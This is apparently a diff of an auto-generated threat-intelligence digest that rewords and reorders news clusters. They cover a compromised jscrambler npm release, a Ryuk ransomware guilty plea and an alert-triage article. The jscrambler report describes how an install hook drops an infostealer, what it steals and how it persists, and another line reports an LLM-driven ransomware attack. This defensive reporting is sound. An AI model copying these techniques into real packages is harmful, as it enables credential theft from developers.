Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
-```
-
-#### Corroborating sources (1)
-
-- **Exploit-DB** (offensive_vulnerability_research)
-  - Title: [remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
-  - Published: 2026-07-07T00:00:00+00:00
-  - Link: https://www.exploit-db.com/exploits/52618
-  - Summary: iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
 
 ### Cluster f0cefbafc4 — score 10
 
@@ -2232,13 +2232,13 @@ A cybersecurity startup dangling millions of dollars to acquire zero-day securit
 #### Summary
 
 ```
-Version 8.14.0 of the jscrambler npm package shipped with a malicious preinstall hook that silently drops and runs a native infostealer during installation, one build each for Windows, macOS, and Linux. Published on July 11, 2026, it needs no import and no CLI call. Installing 8.14.0 is enough to run it. Socket flagged the release six minutes after it was
+The jscrambler npm package was compromised, and simply installing its 8.14.0 release runs an infostealer on your machine. Published on July 11, 2026, the malicious version carries a preinstall hook that drops and executes a native binary, one build each for Windows, macOS, and Linux. Socket flagged the release six minutes after it was published. If you or one of your
 ```
 
 #### Full body
 
 ```
-Compromised jscrambler 8.14.0 npm Release Drops Rust Infostealer During Install  Swati Khandelwal  Jul 11, 2026 Software Supply Chain / Malware Version 8.14.0 of the jscrambler npm package shipped with a malicious preinstall hook that silently drops and runs a native infostealer during installation, one build each for Windows, macOS, and Linux. Published on July 11, 2026, it needs no import and no CLI call. Installing 8.14.0 is enough to run it. Socket flagged the release six minutes after it was published . If you or one of your build systems pulled it in that window, the payload has already run with whatever access your install process had. The hook fires before the package is even set up, and none of it appears in the prior release, 8.13.0. The package diff shows two new files under dist/: setup.js, a small loader, and intro.js, which, despite the name, is not JavaScript but a roughly 7.8MB container packing three gzip-compressed native binaries, one each for Linux, Windows, and macOS. On install, setup.js picks the binary for the host operating system, writes it under a random name in the system temp directory, marks it executable, and launches it detached with its output hidden. The added files are in the published package, but nowhere in jscrambler's public source. StepSecurity and SafeDep , which each pulled and analyzed the release, both report no matching commit, tag, or pull request for 8.14.0 in the GitHub repository, whose latest tag remains 8.13.0. The version was pushed straight to npm under a legitimate maintainer account, bypassing the project's normal release flow, which points to a compromised npm account or build pipeline. Which of the two has not been established. What the binaries do is now clear. Socket, in an updated analysis and a statement to The Hacker News, identifies the payload as a Rust infostealer, built for all three platforms, that sweeps a developer machine for secrets and ships them to a drop server over TLS. The target list is broad and aimed squarely at developers. It pulls cloud credentials from AWS, Azure, and Google Cloud, including the metadata endpoints that CI runners use. It reads cryptocurrency wallets and seed phrases from MetaMask, Phantom, and Exodus, and the vault of the Bitwarden password manager. It scrapes browser-stored passwords and cookies, along with Discord, Slack, Telegram, and Steam sessions. And it goes after something newer: the config files for AI coding tools, including Claude Desktop, Cursor, Windsurf, VS Code, and Zed, where API keys and Model Context Protocol server credentials tend to sit. The binaries reach past ordinary theft. On Linux, the payload links the kernel's BPF library and can load an eBPF program into the kernel from memory, a foothold in the kernel rather than the userspace file access the rest of the stealer relies on; StepSecurity and SafeDep both flagged the capability, though what the eBPF does is still being pulled apart. The Windows and macOS builds add anti-debugging checks, and the stealer wires in persistence to survive a reboot: a hidden Windows scheduled task set to relaunch every minute, and a macOS LaunchAgent that reloads on login. Source: Step Security Its command-and-control details stay encrypted in the binary and never surfaced in static analysis; StepSecurity's runtime monitoring caught the dropped binary reaching out to two hard-coded IP addresses and to Tor infrastructure, the first network indicators published for the campaign. jscrambler is a build-time tool, installed as a development dependency or run from CI. That drops the stealer into exactly the environment it was built to rob: the cloud keys, deploy tokens, and source code a build or CI process can reach. The package sees about 15,800 downloads a week, and how many pulled the compromised version is not yet known. That is a far smaller footprint than the packages hit in the big npm compromises of the past year, which pull billions of downloads a week between them. Fo
+Compromised jscrambler 8.14.0 npm Release Drops Rust Infostealer During Install  Swati Khandelwal  Jul 11, 2026 Software Supply Chain / Malware The jscrambler npm package was compromised, and simply installing its 8.14.0 release runs an infostealer on your machine. Published on July 11, 2026, the malicious version carries a preinstall hook that drops and executes a native binary, one build each for Windows, macOS, and Linux. Socket flagged the release six minutes after it was published . If you or one of your build systems pulled it in that window, the payload has already run with whatever access your install process had. None of this is in the prior release, 8.13.0. The package diff shows two new files under dist/: setup.js, a small loader, and intro.js. Despite the name, intro.js is not JavaScript but a roughly 7.8MB container packing three gzip-compressed native binaries, one each for Linux, Windows, and macOS. On install, setup.js picks the binary for the host operating system, writes it under a random name in the system temp directory, marks it executable, and launches it detached with its output hidden. The added files are in the published package, but nowhere in jscrambler's public source. StepSecurity and SafeDep both pulled and analyzed the release, and both report no matching commit, tag, or pull request for 8.14.0 in the GitHub repository. Its latest tag is still 8.13.0. The version was pushed straight to npm under a legitimate maintainer account, bypassing the project's normal release flow. That points to a compromised npm account or build pipeline. Which of the two has not been established. The payload is a Rust infostealer, built for all three platforms, that sweeps a developer machine for secrets and ships them to a drop server over TLS, according to Socket's updated analysis and a statement to The Hacker News. The target list is broad and aimed at developers: cloud credentials from AWS, Azure, and Google Cloud, including the metadata endpoints CI runners use; cryptocurrency wallets and seed phrases from MetaMask, Phantom, and Exodus; the Bitwarden password manager vault; browser-stored passwords and cookies; and Discord, Slack, Telegram, and Steam sessions. It also goes after something newer: the config files for AI coding tools, including Claude Desktop, Cursor, Windsurf, VS Code, and Zed, where API keys and Model Context Protocol server credentials tend to sit. The binaries do more than steal. On Linux, the payload links the kernel's BPF library and can load an eBPF program straight into the kernel from memory. That is a foothold in the kernel, not the userspace file access that the rest of the stealer relies on. StepSecurity and SafeDep both flagged the capability, though what the eBPF does is still being pulled apart. The Windows and macOS builds add anti-debugging checks, and the stealer wires in persistence to survive a reboot: a hidden Windows scheduled task set to relaunch every minute, and a macOS LaunchAgent that reloads on login. Its command-and-control details stay encrypted in the binary and never surfaced in static analysis. StepSecurity's runtime monitoring caught the dropped binary reaching out to two hard-coded IP addresses and to Tor infrastructure, the first network indicators published for the campaign. jscrambler is a build-time tool, installed as a development dependency or run from CI. Those environments hold what the stealer collects: cloud keys, deploy tokens, and source code that a build or CI process can reach. Source: Step Security The package sees about 15,800 downloads a week, and how many pulled the compromised version is not yet known. That is a far smaller footprint than the packages hit in the big npm compromises of the past year, which pull billions of downloads a week between them. For a stealer aimed at build machines, though, reach was never the point. The access is. The Shai-Hulud worm ran from an install hook to steal tokens and spread through hundreds of packages that
 ```
 
 #### Corroborating sources (1)
@@ -2247,7 +2247,7 @@ Compromised jscrambler 8.14.0 npm Release Drops Rust Infostealer During Install 
   - Title: Compromised jscrambler 8.14.0 npm Release Drops Rust Infostealer During Install
   - Published: 2026-07-11T17:59:26+00:00
   - Link: https://thehackernews.com/2026/07/compromised-jscrambler-8140-npm-release.html
-  - Summary: Version 8.14.0 of the jscrambler npm package shipped with a malicious preinstall hook that silently drops and runs a native infostealer during installation, one build each for Windows, macOS, and Linux. Published on July 11, 2026, it needs no import and no CLI call. Installing 8.14.0 is enough to run it. Socket flagged the release six minutes after it was
+  - Summary: The jscrambler npm package was compromised, and simply installing its 8.14.0 release runs an infostealer on your machine. Published on July 11, 2026, the malicious version carries a preinstall hook that drops and executes a native binary, one build each for Windows, macOS, and Linux. Socket flagged the release six minutes after it was published. If you or one of your
 
 ### Cluster aa4a893323 — score 10
 
@@ -2416,51 +2416,6 @@ Anyone who deals with phishing messages caught by basic security filters knows t
   - Published: 2026-07-10T09:09:29+00:00
   - Link: https://isc.sans.edu/diary/rss/33144
   - Summary: Anyone who deals with phishing messages caught by basic security filters knows that most phishing samples tend to blend into one another, since only a small set of techniques and approaches keeps reappearing in them. That is precisely why it is worth pausing on the occasional message that does something a little out of the ordinary.
-
-### Cluster eaade871e6 — score 9
-
-- Title: Armenian national pleads guilty to Ryuk ransomware attacks
-- Source: CyberScoop (cyber_news_breach_reporting)
-- Published: 2026-07-10T20:13:27+00:00
-- Link: https://cyberscoop.com/karen-vardanyan-armenian-ryuk-ransomware-guilty/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion
-- actor_attribution: Scattered Spider
-- affected_industries: critical_infrastructure, education, government, healthcare
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, apt_espionage
-- actor_attribution: Scattered Spider
-- affected_industries: healthcare, government, critical_infrastructure, education
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Karen Vardanyan faces up to 15 years in federal prison and agreed to pay nearly $1.2 million in restitution. The post Armenian national pleads guilty to Ryuk ransomware attacks appeared first on CyberScoop .
-```
-
-#### Full body
-
-```
-Advertisement Subscribe to our daily newsletter. Subscribe Close An Armenian national who was extradited from Ukraine to the United States last year pleaded guilty to participating in a series of attacks in 2019 and 2020 involving Ryuk ransomware, the Justice Department said Thursday. Karen Serobovich Vardanyan pleaded guilty to computer fraud and conspiracy to commit fraud and extortion. He agreed to pay nearly $1.2 million million in restitution and faces up to 15 years in jail. The 34-year-old admitted to participating in cybercrime from November 2019 to April 2020 when he and his co-conspirators deployed Ryuk ransomware against three U.S.-based organizations while living in Ukraine and Russia. Vardanyan’s victims include a Michigan-based company that paid a ransom of nearly $1.2 million in January 2020, a Watsonville, Oregon-based technology company that was attacked in December 2019 and a Texas-based school breached in February 2020. Advertisement Prosecutors previously accused Vardanyan and his co-conspirators — Ukrainian nationals Oleg Nikolayevich Lyulyava and Andrii Leonydovich Prykhodchenko, and Armenian national Levon Georgiyovych Avetisyan — of illegally accessing computer networks to deploy Ryuk ransomware on hundreds of compromised servers and workstations between March 2019 and September 2020. Ryuk ransomware was prevalent in 2019 and 2020, infecting thousands of victims globally across the private sector, state and local municipalities, local school districts and critical infrastructure, including a wave of attacks on U.S. hospitals. Victims of Ryuk ransomware attacks include Hollywood Presbyterian Medical Center , Universal Health Services , Electronic Warfare Associates , a North Carolina water utility and multiple U.S. newspapers. Ryuk ransomware operators extorted victim companies by demanding ransom payments in Bitcoin in exchange for decryption keys. Justice Department officials said Vardanyan and his co-conspirators received about 1,160 bitcoins — valued at more than $15 million at the time — in ransom payments from victim companies. Vardanyan, as part of his guilty plea, also acknowledged that his conviction will have immigration consequences resulting in removal from the United States after serving his sentence. Advertisement The U.S. District Court for the District of Oregon has yet to schedule his sentencing. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops The Department of Justice building is seen in Washington, DC, on August 9, 2022. (Photo by Stefani Reynolds / AFP) (Photo by STEFANI REYNOLDS/AFP via Getty Images) Gwengoat, iStock/Getty Images Plus (Getty Images) Latest Podcasts When iPhone exploits turn into commodities What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Inside Operation Disruption Week: Taking Down Southeast Asia’s Scam Machine Government French nonprofit starts global intelligence and research hub for AI cyber threats US Army websites defaced with pro-Kurdish sentiments, insults to Trump Someone infected a spyware probe overseer with spyware US lifting export control restrictions on Anthropic’s Mythos, Fable Technology Deepfake CSAM lawsuit against xAI, Grok expands Supreme Court delivers ‘major win’ for tech privacy in Chatrie ruling What the post-quantum executive order really demands of CISOs FCC passes new cybersecurity rules for emergency systems, undersea cables Threats Suspected Chinese espionage group used a Roundcube exploit chain to burrow into universities Alleged longstanding member of Scattered Spider extradited to US Researchers spot exploitation of another critical Oracle defect This phishing kit looks more like BEC-as-a-service Policy Trump budget boss Russell Vought open to re-staffing CISA DHS to unveil replacement council for critical infrastructure cybersecurity Warner bill would create federall
-```
-
-#### Corroborating sources (1)
-
-- **CyberScoop** (cyber_news_breach_reporting)
-  - Title: Armenian national pleads guilty to Ryuk ransomware attacks
-  - Published: 2026-07-10T20:13:27+00:00
-  - Link: https://cyberscoop.com/karen-vardanyan-armenian-ryuk-ransomware-guilty/
-  - Summary: Karen Vardanyan faces up to 15 years in federal prison and agreed to pay nearly $1.2 million in restitution. The post Armenian national pleads guilty to Ryuk ransomware attacks appeared first on CyberScoop .
 
 ### Cluster aad8380132 — score 9
 
@@ -2893,6 +2848,51 @@ Hackers exploit critical auth bypass in Gitea Docker image By Bill Toulas July 1
   - Link: https://www.bleepingcomputer.com/news/security/hackers-exploit-critical-auth-bypass-in-gitea-docker-image/
   - Summary: Hackers are actively exploiting a critical vulnerability in the official Docker image for the Gitea self-hosted Git service that allows attackers to impersonate any user, including administrators. [...]
 
+### Cluster eaade871e6 — score 8
+
+- Title: Armenian national pleads guilty to Ryuk ransomware attacks
+- Source: CyberScoop (cyber_news_breach_reporting)
+- Published: 2026-07-10T20:13:27+00:00
+- Link: https://cyberscoop.com/karen-vardanyan-armenian-ryuk-ransomware-guilty/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion
+- actor_attribution: Scattered Spider
+- affected_industries: critical_infrastructure, education, government, healthcare
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, apt_espionage
+- actor_attribution: Scattered Spider
+- affected_industries: healthcare, government, critical_infrastructure, education
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Karen Vardanyan faces up to 15 years in federal prison and agreed to pay nearly $1.2 million in restitution. The post Armenian national pleads guilty to Ryuk ransomware attacks appeared first on CyberScoop .
+```
+
+#### Full body
+
+```
+Advertisement Subscribe to our daily newsletter. Subscribe Close An Armenian national who was extradited from Ukraine to the United States last year pleaded guilty to participating in a series of attacks in 2019 and 2020 involving Ryuk ransomware, the Justice Department said Thursday. Karen Serobovich Vardanyan pleaded guilty to computer fraud and conspiracy to commit fraud and extortion. He agreed to pay nearly $1.2 million million in restitution and faces up to 15 years in jail. The 34-year-old admitted to participating in cybercrime from November 2019 to April 2020 when he and his co-conspirators deployed Ryuk ransomware against three U.S.-based organizations while living in Ukraine and Russia. Vardanyan’s victims include a Michigan-based company that paid a ransom of nearly $1.2 million in January 2020, a Watsonville, Oregon-based technology company that was attacked in December 2019 and a Texas-based school breached in February 2020. Advertisement Prosecutors previously accused Vardanyan and his co-conspirators — Ukrainian nationals Oleg Nikolayevich Lyulyava and Andrii Leonydovich Prykhodchenko, and Armenian national Levon Georgiyovych Avetisyan — of illegally accessing computer networks to deploy Ryuk ransomware on hundreds of compromised servers and workstations between March 2019 and September 2020. Ryuk ransomware was prevalent in 2019 and 2020, infecting thousands of victims globally across the private sector, state and local municipalities, local school districts and critical infrastructure, including a wave of attacks on U.S. hospitals. Victims of Ryuk ransomware attacks include Hollywood Presbyterian Medical Center , Universal Health Services , Electronic Warfare Associates , a North Carolina water utility and multiple U.S. newspapers. Ryuk ransomware operators extorted victim companies by demanding ransom payments in Bitcoin in exchange for decryption keys. Justice Department officials said Vardanyan and his co-conspirators received about 1,160 bitcoins — valued at more than $15 million at the time — in ransom payments from victim companies. Vardanyan, as part of his guilty plea, also acknowledged that his conviction will have immigration consequences resulting in removal from the United States after serving his sentence. Advertisement The U.S. District Court for the District of Oregon has yet to schedule his sentencing. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops The Department of Justice building is seen in Washington, DC, on August 9, 2022. (Photo by Stefani Reynolds / AFP) (Photo by STEFANI REYNOLDS/AFP via Getty Images) Gwengoat, iStock/Getty Images Plus (Getty Images) Latest Podcasts When iPhone exploits turn into commodities What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Inside Operation Disruption Week: Taking Down Southeast Asia’s Scam Machine Government French nonprofit starts global intelligence and research hub for AI cyber threats US Army websites defaced with pro-Kurdish sentiments, insults to Trump Someone infected a spyware probe overseer with spyware US lifting export control restrictions on Anthropic’s Mythos, Fable Technology Deepfake CSAM lawsuit against xAI, Grok expands Supreme Court delivers ‘major win’ for tech privacy in Chatrie ruling What the post-quantum executive order really demands of CISOs FCC passes new cybersecurity rules for emergency systems, undersea cables Threats Suspected Chinese espionage group used a Roundcube exploit chain to burrow into universities Alleged longstanding member of Scattered Spider extradited to US Researchers spot exploitation of another critical Oracle defect This phishing kit looks more like BEC-as-a-service Policy Trump budget boss Russell Vought open to re-staffing CISA DHS to unveil replacement council for critical infrastructure cybersecurity Warner bill would create federall
+```
+
+#### Corroborating sources (1)
+
+- **CyberScoop** (cyber_news_breach_reporting)
+  - Title: Armenian national pleads guilty to Ryuk ransomware attacks
+  - Published: 2026-07-10T20:13:27+00:00
+  - Link: https://cyberscoop.com/karen-vardanyan-armenian-ryuk-ransomware-guilty/
+  - Summary: Karen Vardanyan faces up to 15 years in federal prison and agreed to pay nearly $1.2 million in restitution. The post Armenian national pleads guilty to Ryuk ransomware attacks appeared first on CyberScoop .
+
 ### Cluster 6b9fe41d07 — score 8
 
 - Title: CISA looks to remedy ailments from big May credential leak
@@ -2933,6 +2933,45 @@ Advertisement Subscribe to our daily newsletter. Subscribe Close A major credent
   - Published: 2026-07-10T18:54:28+00:00
   - Link: https://cyberscoop.com/cisa-credential-leak-forensic-report/
   - Summary: A major credential leak spurred the Cybersecurity and Infrastructure Security Agency to strengthen protections for its sensitive materials, improve how researchers can report agency vulnerabilities and develop plans for similar incidents, the agency said in a forensic report released Thursday. The blog post outlines CISA’s response to the leak that the researcher who discovered it […] The post CISA looks to remedy ailments from big May credential leak appeared first on CyberScoop .
+
+### Cluster 152995b5e9 — score 8
+
+- Title: Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage
+- Source: Black Hills Information Security (detection_response_operations)
+- Published: 2026-07-08T14:00:00+00:00
+- Link: https://www.blackhillsinfosec.com/the-goldilocks-zone/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+We're all petrified about missing a critical event or misclassifying an alert, but when we're talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It's easy to get caught up with one alert because it feels "too hot" or maybe not spend enough time looking into something that initially seems "too cold." The post Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage appeared first on Black Hills Information Security, Inc. .
+```
+
+#### Full body
+
+```
+8 Jul 2026 Active SOC , Blue Team , DFIR , Hayden Covington , Incident Response , Informational Alert Traige , Detection Logic , Infosec for Beginners , InfoSec Survival Guide , Orange Book , SIEM Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage | Hayden Covington This article was originally published in the InfoSec Survival Guide: Orange Book — Incident Response. Read it free online HERE , or grab it on the Spearphish General Store (free digital download or a $1.25 physical copy, your call). Security engineers, analysts, and incident responders all have one thing in common, and I’m not talking about 3 AM phone calls concerning incidents. I’m talking about triage: that challenging moment of urgency when assessments must be made and classifications communicated—for the right things to be decided on to prevent the bad stuff from happening. We’re all petrified about missing a critical event or misclassifying an alert, but when we’re talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It’s easy to get caught up with one alert because it feels “too hot” or maybe not spend enough time looking into something that initially seems “too cold.” I’ll provide some tips, tricks, and techniques to help find that “Goldilocks Zone” of spending just the right amount of time on an alert, allowing you to quickly triage and move on to the next. Consider the Severities The simplest way to triage events is to consider the severity of the alert. Initially, most Low-severity alerts should be entirely ignored. On any given case, time is limited, and the value return of going over hundreds of Low alerts is not even remotely comparable to that of reviewing higher priority findings. Mediums will often be the bulk of your alert volume, with these being right in that uncomfortable middle of the “Probably nothing” of Lows and the “Definitely something” of Highs or Criticals. To move quickly on an IR engagement, I categorically relegate the Medium alerts to a later time on that case; and almost every time, the High and Critical alerts tell the real story, giving concrete direction on how to search the Mediums and Lows in a more targeted fashion. Anomalies Against the Baseline One of the most surefire ways to quickly classify an event as a true or false positive is to compare the activity against the normal baseline: “Does this happen regularly on this host,” “in this environment,” or maybe even “in any of the environments I can observe?” While a certain execution or activity on one host may appear anomalous, once you discover that it happens on a number of hosts across multiple environments, either you’ve just found your answer, or you’ve discovered a much bigger issue… Actions on Objective One of my favorite tactics is considering “actions on objective.” If an attacker gains access to a host, they have an end goal in mind. Whether that goal is financially motivated, a desire to steal data, or even if they just want to observe activity in the environment—they broke in for a purpose. Someone isn’t going to go through the effort of breaking into your house just to stand around. For the attacker to achieve their goals, some form of activity must occur to get them there. That often looks like exfiltration or lateral movement. All that to say, if the activity you’re looking at never actually goes anywhere, steals anything, or tries to override anything else, chances are it may not actually be evil, because it certainly isn’t doing the attacker much good. Detection Intent Probably the most novel (and somewhat controversial) approach I’ve come across is considering detection intent first and foremost. This approach requires you to understand exactly what it is that the rule that fired is looking for, and to look for that one specific thing only, ignoring anything else you may see in the periphery. That idea may sound counterintuitive but think about it: Threat detections are often straightfor
+```
+
+#### Corroborating sources (1)
+
+- **Black Hills Information Security** (detection_response_operations)
+  - Title: Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage
+  - Published: 2026-07-08T14:00:00+00:00
+  - Link: https://www.blackhillsinfosec.com/the-goldilocks-zone/
+  - Summary: We're all petrified about missing a critical event or misclassifying an alert, but when we're talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It's easy to get caught up with one alert because it feels "too hot" or maybe not spend enough time looking into something that initially seems "too cold." The post Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage appeared first on Black Hills Information Security, Inc. .
 
 ### Cluster 8fa37afed0 — score 8
 
@@ -3027,45 +3066,6 @@ Cyberattacks & Data Breaches Threat Intelligence Cybersecurity Operations Vulner
   - Published: 2026-07-06T16:36:50+00:00
   - Link: https://www.darkreading.com/cyberattacks-data-breaches/jadepuffer-first-complete-llm-driven-ransomware-attack
   - Summary: An "agentic threat actor" successfully exploited a Langflow flaw to steal data from a production database server and encrypt other systems.
-
-### Cluster 152995b5e9 — score 8
-
-- Title: Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage
-- Source: Black Hills Information Security (detection_response_operations)
-- Published: 2026-07-08T14:00:00+00:00
-- Link: https://www.blackhillsinfosec.com/the-goldilocks-zone/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-We're all petrified about missing a critical event or misclassifying an alert, but when we're talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It's easy to get caught up with one alert because it feels "too hot" or maybe not spend enough time looking into something that initially seems "too cold." The post Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage appeared first on Black Hills Information Security, Inc. .
-```
-
-#### Full body
-
-```
-8 Jul 2026 Active SOC , Blue Team , DFIR , Hayden Covington , Incident Response , Informational Alert Traige , Detection Logic , Infosec for Beginners , InfoSec Survival Guide , Orange Book , SIEM Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage | Hayden Covington This article was originally published in the InfoSec Survival Guide: Orange Book — Incident Response. Read it free online HERE , or grab it on the Spearphish General Store (free digital download or a $1.25 physical copy, your call). Security engineers, analysts, and incident responders all have one thing in common, and I’m not talking about 3 AM phone calls concerning incidents. I’m talking about triage: that challenging moment of urgency when assessments must be made and classifications communicated—for the right things to be decided on to prevent the bad stuff from happening. We’re all petrified about missing a critical event or misclassifying an alert, but when we’re talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It’s easy to get caught up with one alert because it feels “too hot” or maybe not spend enough time looking into something that initially seems “too cold.” I’ll provide some tips, tricks, and techniques to help find that “Goldilocks Zone” of spending just the right amount of time on an alert, allowing you to quickly triage and move on to the next. Consider the Severities The simplest way to triage events is to consider the severity of the alert. Initially, most Low-severity alerts should be entirely ignored. On any given case, time is limited, and the value return of going over hundreds of Low alerts is not even remotely comparable to that of reviewing higher priority findings. Mediums will often be the bulk of your alert volume, with these being right in that uncomfortable middle of the “Probably nothing” of Lows and the “Definitely something” of Highs or Criticals. To move quickly on an IR engagement, I categorically relegate the Medium alerts to a later time on that case; and almost every time, the High and Critical alerts tell the real story, giving concrete direction on how to search the Mediums and Lows in a more targeted fashion. Anomalies Against the Baseline One of the most surefire ways to quickly classify an event as a true or false positive is to compare the activity against the normal baseline: “Does this happen regularly on this host,” “in this environment,” or maybe even “in any of the environments I can observe?” While a certain execution or activity on one host may appear anomalous, once you discover that it happens on a number of hosts across multiple environments, either you’ve just found your answer, or you’ve discovered a much bigger issue… Actions on Objective One of my favorite tactics is considering “actions on objective.” If an attacker gains access to a host, they have an end goal in mind. Whether that goal is financially motivated, a desire to steal data, or even if they just want to observe activity in the environment—they broke in for a purpose. Someone isn’t going to go through the effort of breaking into your house just to stand around. For the attacker to achieve their goals, some form of activity must occur to get them there. That often looks like exfiltration or lateral movement. All that to say, if the activity you’re looking at never actually goes anywhere, steals anything, or tries to override anything else, chances are it may not actually be evil, because it certainly isn’t doing the attacker much good. Detection Intent Probably the most novel (and somewhat controversial) approach I’ve come across is considering detection intent first and foremost. This approach requires you to understand exactly what it is that the rule that fired is looking for, and to look for that one specific thing only, ignoring anything else you may see in the periphery. That idea may sound counterintuitive but think about it: Threat detections are often straightfor
-```
-
-#### Corroborating sources (1)
-
-- **Black Hills Information Security** (detection_response_operations)
-  - Title: Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage
-  - Published: 2026-07-08T14:00:00+00:00
-  - Link: https://www.blackhillsinfosec.com/the-goldilocks-zone/
-  - Summary: We're all petrified about missing a critical event or misclassifying an alert, but when we're talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It's easy to get caught up with one alert because it feels "too hot" or maybe not spend enough time looking into something that initially seems "too cold." The post Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage appeared first on Black Hills Information Security, Inc. .
 
 ### Cluster 8f97c174fa — score 8
 
